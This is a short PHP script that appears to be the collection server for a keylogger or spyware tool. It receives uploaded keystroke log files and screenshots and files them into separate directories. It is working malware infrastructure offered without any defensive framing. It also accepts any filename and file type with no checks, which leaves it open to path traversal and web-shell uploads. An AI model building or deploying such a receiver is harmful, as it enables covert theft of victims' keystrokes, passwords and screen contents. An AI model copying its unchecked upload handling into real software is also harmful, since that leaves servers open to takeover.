<?php 

// define base file names of the files this script can recognize
define('KEY_LOG_FILE_BASE_NAME', 'KEY_LOG');
define('SCREENSHOT_FILE_BASE_NAME', 'SCREENSHOT');

// define directories of recognized files
define('KEY_LOG_DIRECTORY', __DIR__ . '/key_logs/');
define('UNKNOWN_FILE_DIRECTORY', __DIR__. '/unknown_files/');
define('SCREENSHOT_DIRECTORY', __DIR__ . '/screenshots/');

/**
 * Moves uploaded file to specified target file
 * 
 * @param string target - target file to move to
 */
function moveUploadedFile($target){
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)){
        echo 'file has been uploaded successfully';
    }else{
        echo 'file upload failed';
    }
}

// accept the file
$fileName = $_FILES['file']['name'];

// check if the file is recognizable
if(strpos($fileName, KEY_LOG_FILE_BASE_NAME) !== false && strpos($fileName, ".txt") !== false){
    // the uploaded file is a key log file
    moveUploadedFile(KEY_LOG_DIRECTORY . $fileName);
}else if(strpos($fileName, SCREENSHOT_FILE_BASE_NAME) !== false && (strpos($fileName, '.png') || strpos($fileName, '.jpg') || strpos($fileName, '.jpeg'))){
    // the uploaded file is a screenshot
    moveUploadedFile(SCREENSHOT_DIRECTORY . $fileName);
}else{
    // unrecognized file, put in unknown files directory
    moveUploadedFile(UNKNOWN_FILE_DIRECTORY . $fileName);
}

?>